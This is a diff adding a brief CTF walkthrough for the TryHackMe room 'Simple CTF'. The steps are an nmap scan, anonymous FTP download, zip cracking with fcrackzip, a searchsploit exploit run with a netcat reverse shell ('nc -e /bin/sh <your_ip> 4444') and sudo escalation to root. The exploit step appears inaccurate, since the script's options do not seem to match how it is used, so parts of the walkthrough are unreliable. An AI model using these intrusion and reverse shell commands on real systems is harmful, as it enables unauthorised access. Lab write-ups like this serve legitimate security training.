@@ -1,0 +1,77 @@
+----------------                               ------------------
+               :::::::::::;| SIMPLE CTF |;::::::::::::
+
+
+1) FIRST WE HAVE TO ACCES THE TRYHACKME FROM OPENVPN.
+2) WE HAVE TO JOIN THE ROOM "SIMPLE CTF".
+ 
+TASK - 1 (RECON)
+
+1. SCAN THE MACHNE.
+
+    namp -Pn <ip>
+
+    nmap -A -T 5 <ip> -vv
+
+"it's a Linux machine".
+
+2. How many services are running?
+ANS: 3 services (21/FTP, 80/HTTP, 2222/SSH)
+
+3. What CMS is running?
+ANS: CMS Made Simple
+
+----------TASK 1 COMPLETED----------
+
+TASK - 2 (GAIN ACCESS)
+
+1. CHECK FTP.
+
+    ftp <ip>
+    Username: anonymous
+    Password: (press enter)
+
+"FOUND backup.zip! Download:"
+
+    get backup.zip
+
+2. CRACK ZIP.
+
+    fcrackzip -u -D -p rockyou.txt backup.zip
+
+"Password: password123 (LOL)"
+
+----------TASK 2 COMPLETED-----------
+ 
+TASK - 3 (ESCALATE)
+
+1. GET SHELL.
+
+    searchsploit CMS Made Simple
+    python 46635.py -u http://<ip> -c "nc -e /bin/sh <your_ip> 4444"
+
+"GOT SHELL AS www-data!"
+
+2. PRIV ESC.
+
+    sudo -l
+    "Can run /bin/bash as root!"
+    sudo /bin/bash
+
+"ROOTED!"
+
+----------TASK 3 COMPLETED-----------
+
+TASK-4 (FIND FLAGS)
+
+1. USER FLAG.
+
+    cat /home/mitch/user.txt
+
+2. ROOT FLAG.
+
+    cat /root/root.txt
+
+-------------------                                                --------------------
+             -----------                                    ------------
+                  ---------- SIMPLE CTF = SIMPLE WIN ----------
